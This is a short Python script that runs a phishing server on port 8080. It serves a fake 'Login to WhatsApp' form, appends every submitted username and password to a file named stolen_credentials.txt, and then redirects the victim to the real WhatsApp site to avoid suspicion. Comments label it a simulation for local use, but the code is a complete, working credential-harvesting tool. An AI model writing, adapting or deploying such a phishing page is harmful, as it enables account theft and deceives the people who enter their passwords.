from http.server import BaseHTTPRequestHandler, HTTPServer
import logging

# Create a basic phishing web server to simulate login page
class PhishHTTPRequestHandler(BaseHTTPRequestHandler):

    # Serve a fake HTML page that looks like a login page
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(b"""
            <html>
            <body>
                <h2>Login to WhatsApp</h2>
                <form action="/login" method="post">
                    Username: <input type="text" name="username"><br>
                    Password: <input type="password" name="password"><br>
                    <input type="submit" value="Login">
                </form>
            </body>
            </html>
        """)

    # Capture the login information when the form is submitted
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode("utf-8")

        logging.info(f"Captured Data: {post_data}")

        # Log the stolen credentials (illegal if done in real scenarios)
        with open("stolen_credentials.txt", "a") as f:
            f.write(post_data + "\n")

        # Redirect the user to the actual login page (to avoid suspicion)
        self.send_response(302)
        self.send_header('Location', 'https://www.whatsapp.com/')
        self.end_headers()


# Set up the phishing server (use only locally to understand the structure)
def run_server(server_class=HTTPServer, handler_class=PhishHTTPRequestHandler):
    server_address = ('', 8080)
    httpd = server_class(server_address, handler_class)
    print("Server running on port 8080...")
    httpd.serve_forever()

if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)
    run_server()
